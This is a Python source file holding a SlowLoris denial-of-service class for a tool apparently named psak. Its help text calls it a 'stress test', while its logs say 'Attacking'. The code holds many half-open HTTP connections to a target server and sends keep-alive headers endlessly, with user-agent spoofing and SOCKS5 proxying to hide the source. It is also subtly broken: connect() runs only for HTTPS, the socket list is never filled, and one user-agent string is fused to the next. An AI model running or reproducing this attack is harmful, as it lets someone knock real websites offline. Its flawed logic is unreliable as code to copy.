#!/usr/bin/env python3
"""
 Copyright (c) 2017, Syslog777
 
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
 are permitted provided that the following conditions are met:
 
     * Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
     * Redistributions in binary form must reproduce the above copyright notice,
       this list of conditions and the following disclaimer in the documentation
       and/or other materials provided with the distribution.
     * Neither the name of Desktop nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
"""

Copyright (c) 2015 Gökberk Yaltıraklı

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
"""
"""
This module should only be used from the psak.py class
"""
# !/usr/bin/python
import logging
import random
import socket
import ssl
import sys
import time


class SlowLoris:

    def __init__(self, parser):
        self.parser = parser
        self.parser.add_argument('--host', help="Host to perform stress test on")
        self.parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
        self.parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use in the test", type=int)
        self.parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
        self.parser.add_argument('-ua', '--randuseragents', dest="randuseragent", action="store_true",
                                 help="Randomizes user-agents with each request")
        self.parser.add_argument('-x', '--useproxy', dest="useproxy", action="store_true",
                                 help="Use a SOCKS5 proxy for connecting")
        self.parser.add_argument('--proxy-host', default="127.0.0.1", help="SOCKS5 proxy host")
        self.parser.add_argument('--proxy-port', default="8080", help="SOCKS5 proxy port", type=int)
        self.parser.add_argument("--https", dest="https", action="store_true", help="Use HTTPS for the requests")
        self.parser.set_defaults(verbose=False)
        self.parser.set_defaults(randuseragent=False)
        self.parser.set_defaults(useproxy=False)
        self.parser.set_defaults(https=False)
        self.args = self.parser.parse_args()
        if len(sys.argv) <= 1:
            self.parser.print_help()
            sys.exit(1)

        if not self.args.host:
            print("Host required!")
            self.parser.print_help()
            sys.exit(1)

        if self.args.useproxy:
            # Tries to import to external "socks" library
            # and monkey patches socket.socket to connect over
            # the proxy by default
            try:
                import socks

                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, self.args.proxy_host, self.args.proxy_port)
                socket.socket = socks.socksocket
                logging.info("Using SOCKS5 proxy for connecting...")
            except ImportError:
                logging.error("Socks Proxy Library Not Available!")

        if self.args.verbose:
            logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG)
        else:
            logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.INFO)

        self.list_of_sockets = []
        self.user_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
        ]

    def init_socket(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if self.args.https:
            s = ssl.wrap_socket(s)

            s.connect((ip, self.args.port))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        if self.args.randuseragent:
            s.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode("utf-8"))
        else:
            s.send("User-Agent: {}\r\n".format(self.user_agents[0]).encode("utf-8"))
            s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s

    def poisen(self):
        ip = self.args.host
        socket_count = self.args.sockets
        logging.info("Attacking %s with %s sockets.", ip, socket_count)

        logging.info("Creating sockets...")
        for _ in range(socket_count):
            try:
                logging.debug("Creating socket nr %s", _)
                s = self.init_socket(ip)
            except socket.error:
                break
                self.list_of_sockets.append(s)

        while True:
            logging.info("Sending keep-alive headers... Socket count: %s", len(self.list_of_sockets))
            for s in list(self.list_of_sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    self.list_of_sockets.remove(s)

            for _ in range(socket_count - len(self.list_of_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s = self.init_socket(ip)
                    if s:
                        self.list_of_sockets.append(s)
                except socket.error:
                    break
            time.sleep(15)
